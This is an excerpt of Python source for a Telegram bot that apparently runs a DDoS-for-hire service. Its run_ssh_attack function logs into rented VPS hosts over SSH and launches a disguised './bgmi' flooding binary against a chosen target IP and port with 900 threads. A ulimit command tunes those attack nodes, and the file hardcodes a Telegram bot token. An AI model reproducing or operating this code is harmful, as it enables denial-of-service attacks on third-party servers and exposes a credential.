...
import datetime
current_time = datetime.datetime.now(datetime.timezone.utc)  # ✅ Works in Python 3.8+
...
TELEGRAM_BOT_TOKEN = "7960283920:AAEWB4ph19DtfOPL3q8Jm4tCtwN5IUyadhI"
...
async def run_ssh_attack(vps_data, target_ip, port, duration, chat_id, context, attack_type="regular", pkt_size=1024, thread_count=900, success_count=None):
    async with SSH_SEMAPHORE:
        try:
            ...
            command = f"nohup bash -c 'exec -a bgmi ./bgmi {target_ip} {port} {duration} {pkt_size} {thread_count}' > attack.log 2>&1 & echo $! > attack_pid.txt"
...
async def ulimit_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # ✅ Check authorization (Only Owner/Admins can use this)
    ...
    # ✅ Extract VPS IP from command arguments
    args = context.args
    if len(args) < 1:
        await context.bot.send_message(chat_id, "⚠️ *Usage:* `/ulimit <vps_ip> [new_limit]`", parse_mode="Markdown")
        return

    vps_ip = args[0]
    new_limit = args[1] if len(args) > 1 else None  # Optional new limit

    # ✅ Find VPS in the database
    vps_data = vps_collection.find_one({"ip": vps_ip})
    if not vps_data:
        await context.bot.send_message(chat_id, f"❌ *No VPS found with IP {vps_ip}!*", parse_mode="Markdown")
        return

    # ✅ Run the ulimit command on the VPS via SSH
    async with SSH_SEMAPHORE:
        try:
            conn = await asyncssh.connect(
                vps_data["ip"],
            ...
            result = await conn.run("ulimit -n", check=False)
            current_limit = result.stdout.strip()

            if new_limit:
                # ✅ Set new ulimit
                await conn.run(f"ulimit -n {new_limit}", check=False)
                result = await conn.run("ulimit -n", check=False)
                updated_limit = result.stdout.strip()
                await context.bot.send_message(chat_id, f"✅ *Ulimit updated on {vps_ip}:* `{current_limit} → {updated_limit}`", parse_mode="Markdown")
            else:
                # ✅ Just show current ulimit
                await context.bot.send_message(chat_id, f"🔍 *Current ulimit on {vps_ip}:* `{current_limit}`", parse_mode="Markdown")

            await conn.close()

        except asyncssh.Error as e:
            await context.bot.send_message(chat_id, f"❌ *SSH error on {vps_ip}:* `{str(e)}`", parse_mode="Markdown")
        except Exception as e:
            await context.bot.send_message(chat_id, f"❌ *Unexpected error on {vps_ip}:* `{str(e)}`", parse_mode="Markdown")
...
def main():
    ...
    app.add_handler(CommandHandler("ulimit", ulimit_command))
